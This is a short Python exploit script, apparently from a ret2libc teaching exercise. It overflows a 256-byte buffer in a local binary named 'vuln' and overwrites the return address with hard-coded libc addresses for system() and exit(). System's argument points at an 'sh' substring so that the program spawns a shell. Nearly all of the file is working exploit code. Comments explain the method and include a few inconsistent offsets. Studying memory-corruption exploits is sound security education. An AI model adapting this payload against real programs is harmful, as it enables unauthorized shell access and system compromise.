#!/usr/bin/env python
# exp.py
import struct
from subprocess import call

# Since ALSR is disabled, libc base address would remain constant and hence we
# can easily find the function address we want by adding the offset to it. 
# For example system address = libc base address + system offset
# where 
#  libc base address = 0xb7e5f000 (Constant address, obtained from ldd /lib/libc.so.6)
#  system offset     = 0x0003f060 (obtained from "nm /lib/libc.so.6 | grep system")

system = 0xb7e5f000 + 0x3af60
exit   = 0xb7e5f000 + 0x2ddc0

# gdb vuln; p system; p exit;
# system = 0x16bf60
# exit   = 0x15edc0

# system_arg points to 'sh' substring of 'fflush' string. 
# To spawn a shell, system argument should be 'sh' and hence this is the reason
# for adding fflush() in vuln.c. 
# But incase there is no 'sh' in vulnerable binary, we can take the other approach
# of pushing 'sh' string at the end of user input!!
system_arg = 0x8048294     # (obtained from hexdump output of the binary)

# endianess conversion
def conv(num):
    return struct.pack("<I", num)

buf = "A" * (256 + 4)
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)

with open("buf", "wb") as f:
    f.write(buf)

print "Calling vulnerable program"
call(["./vuln", buf])
